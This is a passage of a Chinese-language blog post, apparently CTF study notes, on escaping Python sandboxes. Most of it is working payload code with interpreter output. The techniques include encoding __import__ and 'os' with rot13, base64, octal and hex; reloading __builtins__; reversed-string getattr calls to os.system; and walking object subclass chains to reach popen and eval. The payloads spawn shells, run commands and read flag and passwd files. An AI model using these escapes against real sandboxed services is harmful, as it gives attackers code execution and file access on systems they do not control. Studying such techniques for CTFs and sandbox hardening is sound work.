class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)&#125;</span>&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240726135740024.png" alt="image-20240726135740024"></p><h4 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印所有命令行参数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;All command line arguments:&quot;</span>, sys.argv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印脚本名称</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Script name:&quot;</span>, sys.argv[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印传递给脚本的参数</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Arguments passed to the script:&quot;</span>, sys.argv[<span class="number">1</span>:])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No arguments were passed to the script.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (ctf) ➜  python_test python test.py 1 2 3</span></span><br><span class="line"><span class="comment"># All command line arguments: [&#x27;test.py&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;]</span></span><br><span class="line"><span class="comment"># Script name: test.py</span></span><br><span class="line"><span class="comment"># Arguments passed to the script: [&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;]</span></span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正常退出</span></span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 非正常退出，返回错误码 1</span></span><br><span class="line">sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印模块搜索路径</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Module search paths:&quot;</span>, sys.path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Module search paths: [&#x27;/home/void2eye/python_test&#x27;, &#x27;/usr/lib/python310.zip&#x27;, &#x27;/usr/lib/python3.10&#x27;, &#x27;/usr/lib/python3.10/lib-dynload&#x27;, &#x27;/usr/local/lib/python3.10/dist-packages&#x27;, &#x27;/usr/lib/python3/dist-packages&#x27;]</span></span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line"><span class="comment"># sys.stdin, sys.stdout 和 sys.stderr 分别表示标准输入、标准输出和标准错误流。可以重定向这些流。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重定向标准输出</span></span><br><span class="line">sys.stdout = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;This will be written to the file output.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复标准输出</span></span><br><span class="line">sys.stdout = sys.__stdout__</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;This will be printed to the console&quot;</span>)</span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印 Python 版本信息</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Python version:&quot;</span>, sys.version)</span><br></pre></td></tr></table></figure><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><h4 id="file-函数"><a href="#file-函数" class="headerlink" title="file 函数"></a>file 函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(<span class="string">&#x27;flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h4 id="open-函数"><a href="#open-函数" class="headerlink" title="open 函数"></a>open 函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h4 id="codecs模块"><a href="#codecs模块" class="headerlink" title="codecs模块"></a>codecs模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">codecs.<span class="built_in">open</span>(<span class="string">&#x27;test&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240726141949922.png" alt="image-20240726141949922"></p><h4 id="Filetype-函数-from-types-模块"><a href="#Filetype-函数-from-types-模块" class="headerlink" title="Filetype 函数 from types 模块"></a>Filetype 函数 from types 模块</h4><p>可以用来读取文件</p><blockquote><p>只能在py2里面用</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line"><span class="built_in">print</span> types.FileType(<span class="string">&quot;flag&quot;</span>).read()</span><br></pre></td></tr></table></figure><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="禁用import-os-引入"><a href="#禁用import-os-引入" class="headerlink" title="禁用import  os 引入"></a>禁用import  os 引入</h2><h3 id="使用内联函数："><a href="#使用内联函数：" class="headerlink" title="使用内联函数："></a>使用内联函数：</h3><p>因为<strong>import</strong>函数本身是用来动态的导入模块，比如：<code>import(module)</code> 或者 <code>import module</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">__import__</span>(<span class="string">&quot;bf&quot;</span>.decode(<span class="string">&#x27;rot_13&#x27;</span>))       </span><br><span class="line"><span class="comment"># 注意只有py2才能这么写，py3里的str类是没有decode的方法的，且py3的decode改为从字节数据到字符串的转换</span></span><br><span class="line">a.system(<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240726142726782.png" alt="image-20240726142726782"></p><p>所以py3要么自己写解码脚本，要么用codecs库，其提供了一种编码和解码数据流的接口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = __import__(codecs.decode(&#x27;bf&#x27;, &#x27;rot_13&#x27;))</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240726143157021.png" alt="image-20240726143157021"></p><h3 id="importlib库"><a href="#importlib库" class="headerlink" title="importlib库"></a><strong>importlib库</strong></h3><p>同款用法</p><p>python2就用<code>decode</code>，python3就用<code>codecs</code></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240726143355827.png" alt="image-20240726143355827"></p><h3 id="builtins函数"><a href="#builtins函数" class="headerlink" title="builtins函数"></a><strong>builtins函数</strong></h3><p>n. 执行内建的函数；内键指令<br>adj. 安装在内部的；装入的，内装式<br>网络 内装；装入的</p><p>该函数模块中的函数都被自动引入，不需要再单独引入) , <code>dir(__builtins__)</code> 查看剩余可用内置函数</p><p>一个模块对象有一个由字典对象实现的命名空间，属性引用被转换为这个字典中的查找，例如，<code>m.x</code>等同于<code>m.__dict__[“x”]</code>,我们就可以用一些编码来绕过字符明文检测。</p><p>所以可以有</p><blockquote><p>注意，py3中的<code>base64</code> 编码和解码需要处理的是 <code>bytes</code> 对象，而不是 <code>str</code> 对象</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).system(<span class="string">&#x27;sh&#x27;</span>)    <span class="comment"># py2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__builtins__.__dict__[codecs.decode(<span class="string">b&#x27;X19pbXBvcnRfXw==&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)](codecs.decode(<span class="string">b&#x27;b3M=&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)).system(<span class="string">&#x27;sh&#x27;</span>)    <span class="comment"># py3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">等同于</span><br><span class="line">__builtins__.__dict__[_import__](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240726145833422.png" alt="image-20240726145833422"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240726150319679.png" alt="image-20240726150319679"></p><h3 id="路径引入os等模块"><a href="#路径引入os等模块" class="headerlink" title="路径引入os等模块"></a><strong>路径引入os等模块</strong></h3><p>因为一般都是禁止引入敏感包，当禁用os时，实际上就是 <code>sys.modules[‘os’]=None</code></p><p>而因为一般的类linux系统的python os路径都是<code>/usr/lib/python2.7/os.py</code> ,所以可以通过路径引入</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240726150610914.png" alt="image-20240726150610914"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="string">&#x27;/usr/lib/pythonx.xx/os.py&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="reload"><a href="#reload" class="headerlink" title="reload"></a>reload</h3><p>禁止引用某些函数时，可能会删除掉一些函数的引用,比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>]</span><br></pre></td></tr></table></figure><p>这样就无法再引入，但是我们可以用 <code>reload(__builtins__)</code> 重载builtins模块恢复内置函数</p><p>但是<strong>reload</strong>本身也是<strong>builtins</strong>模块的函数，其本身也可能会被禁掉</p><p>在可以引用包的情况下，我们还可以使用<code>imp模块</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> __builtins__</span><br><span class="line"><span class="keyword">import</span> imp</span><br><span class="line">imp.reload(__builtins__)</span><br></pre></td></tr></table></figure><p>这样就可以得到完整的<strong>builtins</strong>模块了，需要注意的是需要先<code>import __builtins__ </code>,如果不写的话，虽然<strong>builtins</strong>模块已经被引入，但是它实际上是不可见的，即它仍然无法被找到,这里是这么说的：</p><blockquote><p>引入imp模块的reload函数能够生效的前提是，在最开始有这样的程序语句import <strong>builtins</strong>，这个import的意义并不是把内建模块加载到内存中，因为内建早已经被加载了，它仅仅是让内建模块名在该作用域中可见。</p></blockquote><p>再如果imp的reload被禁用掉呢？同时禁用掉路径引入需要的sys模块呢？<br>可以尝试上面的execfile()函数,或者open函数打开文件，exec执行代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</span><br><span class="line"><span class="comment"># py2</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span></span><br><span class="line">&lt;built-in function eval&gt;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; del __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">KeyError: &#x27;eval&#x27;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; reload(__builtins__)</span></span><br><span class="line">&lt;module &#x27;__builtin__&#x27; (built-in)&gt;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span></span><br><span class="line">&lt;built-in function eval&gt; </span><br></pre></td></tr></table></figure><h3 id="函数名字符串扫描过滤的绕过-通过getattr来字符串操作"><a href="#函数名字符串扫描过滤的绕过-通过getattr来字符串操作" class="headerlink" title="函数名字符串扫描过滤的绕过(通过getattr来字符串操作)"></a><strong>函数名字符串扫描过滤的绕过</strong>(通过getattr来字符串操作)</h3><p>假如沙箱本身不是通过对包的限制，而是扫描函数字符串，关键码等等来过滤的；而关键字和函数没有办法直接用字符串相关的编码或解密操作</p><p>这里就可以使用： <code>getattr</code> 、<code>__getattribute__</code></p><ul><li><strong>用法</strong>：<ul><li><code>getattr</code> 是一个函数，用于获取属性，通常用于动态属性访问，提供了更高层次的抽象和便利。</li><li><code>__getattribute__</code> 是对象的内置<code>方法</code>，它用于在访问<code>对象</code>的<code>任何属性</code>时自动调用。这是一个低级别的钩子，用于拦截属性访问，可以对其进行<code>重载</code>以<code>自定义属性访问行为</code>。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>),<span class="string">&quot;flfgrz&quot;</span>.encode(<span class="string">&quot;rot13&quot;</span>))(<span class="string">&#x27;ls&#x27;</span>) <span class="comment"># py2 的decode不用我多说</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>),<span class="string">&quot;metsys&quot;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).__getattribute__(<span class="string">&quot;metsys&quot;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># 注意，在使用文件路径import os后：execfile(&#x27;/usr/lib/python2.7/os.py&#x27;)，这个方法会报错，改成</span></span><br><span class="line"><span class="comment"># 直接用os.__getattribute__(&quot;metsys&quot;[::-1])(&#x27;ls&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).__getattribute__(<span class="string">&quot;flfgrz&quot;</span>.encode(<span class="string">&quot;rot13&quot;</span>))(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>如果某个类定义了 getattr() 方法，Python 将只在正常的位置查询属性时才会调用它。如果实例 x 定义了属性 color， x.color 将 不会 调用x.getattr(‘color’)；而只会返回 x.color 已定义好的值。<br>如果某个类定义了 getattribute() 方法，在 每次引用属性或方法名称时 Python 都调用它（特殊方法名称除外，因为那样将会导致讨厌的无限循环）</p></blockquote><p>runoob ：<a href="http://www.runoob.com/python/python-func-getattr.html">http://www.runoob.com/python/python-func-getattr.html</a></p><h3 id="恢复-sys-modules"><a href="#恢复-sys-modules" class="headerlink" title="恢复 sys.modules"></a><strong>恢复 sys.modules</strong></h3><p>一些过滤中可能将 <code>sys.modules[&#39;os&#39;]</code> 进行修改,这个时候即使将 os 模块导入进来,也是无法使用的.</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240726153510310.png" alt="image-20240726153510310"></p><p>由于很多别的命令执行库也使用到了 os,因此也会受到相应的影响,例如 subprocess</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240726153540620.png" alt="image-20240726153540620"></p><p>由于 import 导入模块时会检查 sys.modules 中<code>是否已经有这个类</code>，如果有则不加载,没有则加载.因此我们只需要将 os 模块删除,然后再次导入即可。</p><p>或者说，我们这一步：<code>del sys.modules[&#39;os&#39;]</code>已经把<code>os</code>设置成一个字符串了，看报错就知道</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: &#x27;str&#x27; object has no attribute &#x27;system&#x27;</span><br></pre></td></tr></table></figure><p><code>os</code>已经变成一个字符串类了，所以删了重导就行了</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240726153838434.png" alt="image-20240726153838434"></p><h3 id="基于继承链获取（object类）"><a href="#基于继承链获取（object类）" class="headerlink" title="基于继承链获取（object类）"></a><strong>基于继承链获取</strong>（object类）</h3><p>在清空了 <code>__builtins__</code>的情况下，我们也可以通过索引 subclasses 来找到这些内建函数。</p><p>py2跟py3不一样</p><p>py2里面<code>file</code></p><p>py3里面可以用<code>os._wrap_close</code></p><p><strong>通过mro方法获取继承关系</strong></p><p>payload:（py2）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;flag&quot;</span>).read()</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;flag&quot;</span>).read()</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;w&quot;</span>).write(<span class="string">&quot;1111&quot;</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;flag&quot;).read()&#x27;</span> ) </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[0].__subclasses__()[59]</span></span><br><span class="line"><span class="string">&lt;class &#x27;warnings.catch_warnings&#x27;&gt;</span></span><br><span class="line"><span class="string">注意，py2里面的func_globals在py3重写成__globals__了</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 可以执行命令寻找subclasses下引入过os模块的模块</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload（py3）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">133</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">133</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># warnings.catch_warnings也可以用，不过要重找</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240726161912605.png" alt="image-20240726161912605"></p><p>不能直接在模块的 <code>__globals__</code> 字典中，而是在 <code>__builtins__</code> 字典中找。</p><h2 id="绕过基于字符串匹配的过滤"><a href="#绕过基于字符串匹配的过滤" class="headerlink" title="绕过基于字符串匹配的过滤"></a>绕过基于字符串匹配的过滤</h2><h3 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a><strong>字符串拼接</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;file&#x27;</span>](<span class="string">&#x27;E:/passwd&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__buil&#x27;</span>+<span class="string">&#x27;tins__&#x27;</span>][<span class="string">&#x27;fi&#x27;</span>+<span class="string">&#x27;le&#x27;</span>](<span class="string">&#x27;E:/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p>当然，如果过滤的是 <code>__class__</code> 或者 <code>__mro__</code> 这样的属性名，就无法采用变形来绕过了。</p><h3 id="base64-变形"><a href="#base64-变形" class="headerlink" title="base64 变形"></a><strong>base64 变形</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;__import__&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;b3M=&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)] (<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># py2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="逆序"><a href="#逆序" class="headerlink" title="逆序"></a><strong>逆序</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">root</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意 exec 与 eval 在执行上有所差异。</p><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a><strong>进制转换</strong></h3><p>八进制：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;print(&#x27;RCE&#x27;); __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># subprocess</span></span><br><span class="line">s = <span class="string">&quot;eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False])&quot;</span></span><br><span class="line">octal_string = <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;\\<span class="subst">&#123;<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="built_in">print</span>(octal_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 16进制</span></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29&quot;</span>) </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>其他编码</strong></p><p>hex、rot13、base32 等。</p><h3 id="过滤了属性名或者函数名："><a href="#过滤了属性名或者函数名：" class="headerlink" 